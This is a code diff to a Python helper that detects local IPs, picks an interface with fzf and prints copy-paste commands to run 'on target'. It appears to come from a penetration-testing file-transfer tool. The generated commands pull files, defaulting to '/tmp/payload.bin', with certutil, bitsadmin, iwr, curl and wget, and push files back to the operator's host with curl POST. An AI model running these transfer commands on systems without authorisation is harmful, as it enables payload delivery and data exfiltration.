@@ -1,9 +1,23 @@
 """Local IP detection and interface picker."""
 
+import os
 import re
 import subprocess
 import sys
 from urllib.parse import urlparse
+
+# ANSI colors (only used when stderr is a tty)
+def _c(code: str) -> str:
+    return code if sys.stderr.isatty() else ""
+
+
+BOLD = _c("\033[1m")
+DIM = _c("\033[2m")
+CYAN = _c("\033[36m")
+GREEN = _c("\033[32m")
+YELLOW = _c("\033[33m")
+BLUE = _c("\033[34m")
+RESET = _c("\033[0m")
 
 
 def get_all_interfaces() -> list[tuple[str, str]]:
@@ -34,9 +48,10 @@ def _pick_interface_fzf(choices: list[tuple[str, str]]) -> str | None:
     lines = [f"{name}  {ip}" for name, ip in choices]
     try:
         p = subprocess.run(
-            ["fzf", "--height", "10", "-1"],
+            ["fzf", "--height", "10", "-1", "--prompt", "interface: "],
             input="\n".join(lines),
-            capture_output=True,
+            stdout=subprocess.PIPE,
+            stderr=None,
             text=True,
             timeout=30,
         )
@@ -80,7 +95,8 @@ def pick_platform() -> str | None:
         p = subprocess.run(
             ["fzf", "--height", "5", "-1", "--prompt", "platform: "],
             input="\n".join(lines),
-            capture_output=True,
+            stdout=subprocess.PIPE,
+            stderr=None,
             text=True,
             timeout=30,
         )
@@ -114,7 +130,6 @@ def pick_interface() -> str | None:
         return choices[0][1]
     if not sys.stderr.isatty():
         return get_local_ip()
-    sys.stderr.write("\n  select interface (for command box):\n")
     return _pick_interface_fzf(choices) or _pick_interface_menu(choices)
 
 
@@ -140,6 +155,17 @@ def _base_url(ip: str, port: int) -> str:
     return f"{scheme}://{ip}:{port}"
 
 
+def get_serve_base(port: int, protocol: str = "http") -> tuple[str | None, str | None]:
+    """Run platform and interface pickers; return (base_url, platform) or (None, None). No output."""
+    platform = pick_platform()
+    my_ip = pick_interface()
+    if not my_ip:
+        my_ip = get_local_ip()
+    if not my_ip or protocol != "http":
+        return (None, None)
+    return (_base_url(my_ip, port), platform)
+
+
 def _target_receive_linux(base: str, path: str = "/path/to/file", out: str = "/tmp/payload.bin") -> str:
     p = urlparse(base)
     host, port = p.hostname or "YOUR_IP", p.port or (443 if p.scheme == "https" else 80)
@@ -149,9 +175,13 @@ def _target_receive_linux(base: str, path: str = "/path/to/file", out: str = "/t
 
 def _target_receive_win(base: str, path: str = "/path/to/file", out: str = "out") -> str:
     url = f"{base}{path}"
-    iwr = f'iwr -Uri "{url}" -OutFile "{out}"'
-    bits = f'bitsadmin /transfer job /download /priority high "{url}" "{out}"'
-    return f"curl -o {out} {url}\ncertutil -urlcache -split -f {url} {out}\n{iwr}\n{bits}"
+    return (
+        f"curl -o {out} {url}\n"
+        f"wget -O {out} {url}\n"
+        f"certutil -urlcache -split -f {url} {out}\n"
+        f'iwr -Uri "{url}" -OutFile "{out}"\n'
+        f'bitsadmin /transfer job /download /priority high "{url}" "{out}"'
+    )
 
 
 def _target_send_linux(base: str, path: str = "./file", name: str = "file") -> str:
@@ -162,42 +192,76 @@ def _target_send_win(base: str, path: str = "file", name: str = "file") -> str:
     return f"curl -X POST --data-binary @{path} {base}/{name}"
 
 
-_WIDTH = 56
+def pick_file_to_serve(dir_abs: str) -> str | None:
+    """Fuzzy-pick a file under dir_abs; return relative path or None."""
+    files: list[str] = []
+    for root, _dirs, names in os.walk(dir_abs):
+        rel_root = os.path.relpath(root, dir_abs)
+        if rel_root == ".":
+            rel_root = ""
+        for name in names:
+            path = os.path.join(rel_root, name) if rel_root else name
+            files.append(path)
+    if not files:
+        return None
+    try:
+        p = subprocess.run(
+            ["fzf", "--height", "15", "-1", "--prompt", "file to serve: "],
+            input="\n".join(sorted(files)),
+            stdout=subprocess.PIPE,
+            stderr=None,
+            text=True,
+            timeout=60,
+            cwd=dir_abs,
+        )
+        if p.returncode != 0 or not p.stdout.strip():
+            return None
+        return p.stdout.strip()
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        return None
 
 
-def _box_line(text: str) -> str:
-    return "  |  " + text.ljust(_WIDTH) + "  |\n"
-
-
-def _section(title: str, lines: list[str]) -> str:
-    out = ["", f"  {title}", "  " + "-" * (len(title) + 2)]
+def _write_section(title: str, emoji: str, lines: list[str]) -> None:
+    sys.stderr.write(f"\n  {YELLOW}{BOLD}{emoji} {title}{RESET}\n")
     for line in lines:
-        out.append(f"  {line}")
-    return "\n".join(out) + "\n"
+        sys.stderr.write(f"  {CYAN}{line}{RESET}\n")
 
 
-def print_commands_serve(port: int, protocol: str = "http") -> None:
-    """Print copy-paste commands for target (curl/wget/certutil/iwr/bitsadmin) when we are serving."""
-    platform = pick_platform()
-    my_ip = pick_interface()
-    if not my_ip or protocol != "http":
-        return
-    base = _base_url(my_ip, port)
-    sys.stderr.write("\n")
-    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
-    sys.stderr.write(_box_line("run on target (copy-paste)"))
-    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
+def print_commands_serve(
+    port: int,
+    protocol: str = "http",
+    serve_path: str | None = None,
+    _base: str | None = None,
+    _platform: str | None = None,
+) -> tuple[str | None, str | None]:
+    """Print copy-paste commands for target. Call with _base and _platform from get_serve_base()."""
+    if _base is None or _platform is None:
+        return (None, None)
+    base = _base
+    platform = _platform
+    url_path = ("/" + serve_path) if serve_path else "/path/to/file"
+    path_display = serve_path if serve_path else "path/to/file"
+    name_display = path_display.split("/")[-1] if path_display else "file"
+    out_linux = f"/tmp/{name_display}"
+    out_win = name_display
+    send_path = "path/to/file"
+    send_name = "path/to/file"
+    sys.stderr.write(f"\n  {BOLD}📋 Run on target (copy-paste):{RESET}\n")
+    if serve_path:
+        sys.stderr.write(f"  {DIM}📁 {path_display} — server exits after download{RESET}\n")
     if platform in (None, "linux"):
-        recv_linux = _target_receive_linux(base).split("\n")
-        send_linux = _target_send_linux(base).split("\n")
-        sys.stderr.write(_section("linux: receive from you", recv_linux))
-        sys.stderr.write(_section("linux: send to you", send_linux))
+        recv_lines = _target_receive_linux(base, path=url_path, out=out_linux).strip().split("\n")
+        send_lines = [_target_send_linux(base, path=f"./{send_path}", name=send_name)]
+        _write_section("Linux — receive (curl, wget, bash)", "🐧 ⬇️", recv_lines)
+        _write_section("Linux — send", "🐧 ⬆️", send_lines)
     if platform in (None, "windows"):
-        recv_win = _target_receive_win(base).split("\n")
-        send_win = _target_send_win(base).split("\n")
-        sys.stderr.write(_section("windows: receive from you", recv_win))
-        sys.stderr.write(_section("windows: send to you", send_win))
+        recv_lines = _target_receive_win(base, path=url_path, out=out_win).strip().split("\n")
+        send_lines = [_target_send_win(base, path=send_path, name=send_name)]
+        _write_section("Windows — receive (curl, wget, certutil, iwr, bitsadmin)", "🪟 ⬇️", recv_lines)
+        _write_section("Windows — send", "🪟 ⬆️", send_lines)
     sys.stderr.write("\n")
+    sys.stderr.flush()
+    return (base, platform)
 
 
 def print_commands_receive_listen(port: int, protocol: str = "http") -> None:
@@ -207,14 +271,9 @@ def print_commands_receive_listen(port: int, protocol: str = "http") -> None:
     if not my_ip or protocol != "http":
         return
     base = _base_url(my_ip, port)
-    sys.stderr.write("\n")
-    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
-    sys.stderr.write(_box_line("run on target (POST file to you)"))
-    sys.stderr.write("  +" + "-" * (_WIDTH + 4) + "+\n")
+    sys.stderr.write(f"\n  {BOLD}📋 Run on target (POST file to you):{RESET}\n")
     if platform in (None, "linux"):
-        send_linux = _target_send_linux(base).split("\n")
-        sys.stderr.write(_section("linux", send_linux))
+        _write_section("Linux — send", "🐧 ⬆️", [_target_send_linux(base)])
     if platform in (None, "windows"):
-        send_win = _target_send_win(base).split("\n")
-        sys.stderr.write(_section("windows", send_win))
+        _write_section("Windows — send", "🪟 ⬆️", [_target_send_win(base)])
     sys.stderr.write("\n")
